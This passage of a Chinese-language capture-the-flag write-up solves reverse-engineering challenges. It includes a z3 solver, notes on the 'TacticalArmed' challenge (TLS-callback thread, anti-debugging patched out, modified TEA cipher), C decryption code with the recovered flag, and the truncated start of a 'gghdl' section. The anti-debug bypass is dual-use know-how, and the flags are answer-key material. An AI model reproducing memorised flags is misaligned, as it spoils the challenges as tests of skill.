class="number">0xE6</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x2C</span>, <span class="number">0xB1</span>, <span class="number">0xEC</span>, <span class="number">0x93</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0xA9</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x95</span>, <span class="number">0xBB</span>, <span class="number">0xD3</span>, <span class="number">0x51</span>, <span class="number">0x39</span>, <span class="number">0xE7</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0x29</span>, <span class="number">0x72</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x47</span>, <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x15</span>, <span class="number">0xDF</span>, <span class="number">0xD9</span>, <span class="number">0x17</span>, <span class="number">0x74</span>, <span class="number">0x3F</span>, <span class="number">0x62</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xCD</span>, <span class="number">0x41</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x53</span>, <span class="number">0x85</span>, <span class="number">0x31</span>, <span class="number">0x8A</span>, <span class="number">0x30</span>, <span class="number">0xAA</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xAC</span>, <span class="number">0x2E</span>, <span class="number">0xA3</span>, <span class="number">0x50</span>, <span class="number">0x7A</span>, <span class="number">0xB5</span>, <span class="number">0x8E</span>, <span class="number">0x69</span>, <span class="number">0x1F</span>, <span class="number">0x6A</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x97</span>, <span class="number">0x55</span>, <span class="number">0x3A</span>, <span class="number">0xB2</span>, <span class="number">0x59</span>, <span class="number">0xAB</span>, <span class="number">0xE0</span>, <span class="number">0x28</span>, <span class="number">0xC0</span>, <span class="number">0xB3</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xBE</span>, <span class="number">0xCC</span>, <span class="number">0xC6</span>, <span class="number">0x2B</span>, <span class="number">0x5B</span>, <span class="number">0x92</span>, <span class="number">0xEE</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x84</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x4D</span>, <span class="number">0x0F</span>, <span class="number">0x26</span>, <span class="number">0x4A</span>, <span class="number">0x48</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x80</span>, <span class="number">0x5D</span>, <span class="number">0x6F</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x4C</span>, <span class="number">0xB9</span>, <span class="number">0x81</span>, <span class="number">0x96</span>, <span class="number">0x32</span>, <span class="number">0xFD</span>, <span class="number">0x40</span>, <span class="number">0x8D</span>, <span class="number">0x27</span>, <span class="number">0xC1</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x78</span>, <span class="number">0x4F</span>, <span class="number">0x79</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0x8C</span>, <span class="number">0xE5</span>, <span class="number">0x9E</span>, <span class="number">0xAE</span>, <span class="number">0xBF</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xEF</span>, <span class="number">0x42</span>, <span class="number">0xC5</span>, <span class="number">0xAF</span>, <span class="number">0xA0</span>, <span class="number">0xC2</span>, <span class="number">0xFA</span>, <span class="number">0xC7</span>, <span class="number">0xB6</span>, <span class="number">0xDB</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x18</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0xFE</span>, <span class="number">0xE9</span>, <span class="number">0xF5</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x2F</span>, <span class="number">0xF1</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x1B</span>, <span class="number">0xFB</span>, <span class="number">0xBA</span>, <span class="number">0xA7</span>, <span class="number">0x37</span>, <span class="number">0x8F</span>]</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">101</span>,  <span class="number">85</span>,  <span class="number">36</span>,  <span class="number">54</span>, <span class="number">157</span>, <span class="number">113</span>, <span class="number">184</span>, <span class="number">200</span>, <span class="number">101</span>, <span class="number">251</span>,</span><br><span class="line"></span><br><span class="line">              <span class="number">135</span>, <span class="number">127</span>, <span class="number">154</span>, <span class="number">156</span>, <span class="number">177</span>, <span class="number">223</span>, <span class="number">101</span>, <span class="number">143</span>, <span class="number">157</span>,  <span class="number">57</span>,</span><br><span class="line"></span><br><span class="line">              <span class="number">143</span>,  <span class="number">17</span>, <span class="number">246</span>, <span class="number">142</span>, <span class="number">101</span>,  <span class="number">66</span>, <span class="number">218</span>, <span class="number">180</span>, <span class="number">140</span>,  <span class="number">57</span>,</span><br><span class="line"></span><br><span class="line">              <span class="number">251</span>, <span class="number">153</span>, <span class="number">101</span>,  <span class="number">72</span>, <span class="number">106</span>, <span class="number">202</span>,  <span class="number">99</span>, <span class="number">231</span>, <span class="number">164</span>, <span class="number">121</span>]</span><br><span class="line"></span><br><span class="line">PLAIN = [z<span class="number">3.</span><span class="built_in">BitVec</span>(<span class="string">&quot;p%d&quot;</span> % i, <span class="number">8</span>)<span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">SHIFT = [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">0</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">1</span>] = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">2</span>] = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">3</span>] = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">5</span>] = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">6</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">SHIFT[<span class="number">7</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">s = z<span class="number">3.</span><span class="built_in">Solver</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x28</span>, <span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> j in <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">    left = ((SHIFT[j] &amp; PLAIN[i + <span class="number">3</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">3</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">3</span>]) &gt;&gt; ((<span class="number">3</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">2</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">2</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">2</span>]) &gt;&gt;</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                 ((<span class="number">2</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">1</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">1</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">1</span>]) &gt;&gt; ((<span class="number">1</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i]) &lt;&lt; (<span class="number">8</span> - -j % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i]) &gt;&gt; (-j % <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    right = ((SHIFT[j] &amp; PLAIN[i + <span class="number">7</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">7</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">7</span>]) &gt;&gt; ((<span class="number">7</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">6</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">6</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">6</span>]) &gt;&gt; ((<span class="number">6</span> - j) % <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                  ) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">5</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">5</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">5</span>]) &gt;&gt; ((<span class="number">5</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">4</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">4</span> - j) % <span class="number">8</span>)) | ((SHIFT[j] &amp; PLAIN[i + <span class="number">4</span>]) &gt;&gt; ((<span class="number">4</span> - j) % <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    s.<span class="built_in">add</span>(left | right == CHARSET.<span class="built_in">index</span>(cipher[i+j]))</span><br><span class="line"></span><br><span class="line">sat = s.<span class="built_in">check</span>()</span><br><span class="line"></span><br><span class="line">m = s.<span class="built_in">model</span>()</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ in PLAIN:</span><br><span class="line"></span><br><span class="line">  tmp = m[_].<span class="built_in">as_long</span>()</span><br><span class="line"></span><br><span class="line">  flag .<span class="built_in">append</span>(<span class="built_in">chr</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;.join(flag))</span></span><br></pre></td></tr></table></figure>

<h3><span id="tacticalarmed">TacticalArmed</span><a href="#tacticalarmed" class="header-anchor"></a></h3><ol>
<li><code>TLSCallback0</code> 里头起了个线程</li>
</ol>
<p><img src="./(null)" alt="img"></p>
<ol>
<li>线程填充 key</li>
</ol>
<p><img src="./20211121175536443.jpg" alt="img"></p>
<ol>
<li><code>initterm</code> 里面有反调试</li>
</ol>
<p><img src="./20211121175536448.jpg" alt="img"></p>
<ol>
<li>这个线程在跑起来之后 IDA 的调试功能就没法用了，所以 patch 掉函数指针</li>
</ol>
<p><img src="./20211121175536255.jpg" alt="img"></p>
<ol>
<li>核心部分每次执行的其实都只是一条指令</li>
<li>手动 dump 前面的指令，发现大量的 shr xor 等操作，猜测是 tea，然后发现 delta 变成了 -0x7E5A96D2，密钥是初始化时赋值的，外层循环也能发现轮数改为了 33，并且每次加密后 sum 并没有置为 0</li>
</ol>
<p><img src="./20211121175536576.jpg" alt="img"></p>
<p>exp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA -0x7E5A96D2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM 33</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> gs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = gs, i;          <span class="comment">/* set up */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>]; <span class="comment">/* cache key */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUM; i++) &#123;                          <span class="comment">/* basic cycle start */</span></span><br><span class="line"></span><br><span class="line">    v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line"></span><br><span class="line">    v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line"></span><br><span class="line">    sum -= DELTA;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="comment">/* end cycle */</span></span><br><span class="line"></span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line"></span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> key[] = &#123;<span class="number">0x7CE45630</span>, <span class="number">0x58334908</span>, <span class="number">0x66398867</span>, <span class="number">0x0C35195B1</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">int8_t</span> cipher[<span class="number">40</span>] = &#123;<span class="number">0xED</span>, <span class="number">0x1D</span>, <span class="number">0x2F</span>, <span class="number">0x42</span>, <span class="number">0x72</span>, <span class="number">0xE4</span>, <span class="number">0x85</span>, <span class="number">0x14</span>, <span class="number">0xD5</span>, <span class="number">0x78</span>,</span><br><span class="line"></span><br><span class="line">                       <span class="number">0x55</span>, <span class="number">0x03</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x6B</span>, <span class="number">0xBF</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0xD7</span>, <span class="number">0x97</span>,</span><br><span class="line"></span><br><span class="line">                       <span class="number">0xD1</span>, <span class="number">0x75</span>, <span class="number">0xAE</span>, <span class="number">0x2D</span>, <span class="number">0x63</span>, <span class="number">0xA9</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x74</span>, <span class="number">0x6D</span>,</span><br><span class="line"></span><br><span class="line">                       <span class="number">0x2E</span>, <span class="number">0x29</span>, <span class="number">0xC1</span>, <span class="number">0xFC</span>, <span class="number">0x95</span>, <span class="number">0x97</span>, <span class="number">0xE9</span>, <span class="number">0xC8</span>, <span class="number">0xB5</span>, <span class="number">0x0B</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line"></span><br><span class="line">    gs += DELTA * NUM;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt</span>((<span class="type">uint32_t</span>*)(cipher + i), key);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,cipher);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag <code>kgD1ogB2yGa2roiAeXiG8_aqnLzCJ_rFHSPrn55K</code></p>
<h3><span id="gghdl">gghdl</span><a href="#gghdl" class="header-anchor"></a></h3><p>搜索字符串：<strong>Wrong</strong> 定位关键点。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span 